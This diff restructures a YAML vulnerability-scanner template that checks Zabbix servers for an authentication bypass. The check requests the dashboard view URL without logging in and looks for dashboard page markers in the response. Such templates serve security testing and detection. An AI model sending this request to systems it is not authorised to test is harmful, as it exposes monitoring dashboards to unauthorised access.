@@ -1,15 +1,16 @@
-expression: r0()
-id: zabbix-authentication-bypass
-info:
-  author: FiveAourThe(https://github.com/FiveAourThe)
-  name: Zabbix authentication Bypass
-  severity: high
-  verified: true
+name: poc-yaml-zabbix-authentication-bypass
+manual: true
+transport: http
 rules:
-  r0:
-    expression: response.status == 200 && response.body.bcontains(bytes("<a class=\"top-nav-zbbshare\"
-      target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>"))
-      && response.body.bcontains(b"<title>Dashboard</title>")
-    request:
-      method: GET
-      path: /zabbix.php?action=dashboard.view&dashboardid=1
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /zabbix.php?action=dashboard.view&dashboardid=1
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes("<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>")) && response.body.bcontains(b"<title>Dashboard</title>")
+expression: r0()
+detail:
+    author: FiveAourThe(https://github.com/FiveAourThe)
+    links:
+        - https://www.exploit-db.com/exploits/47467
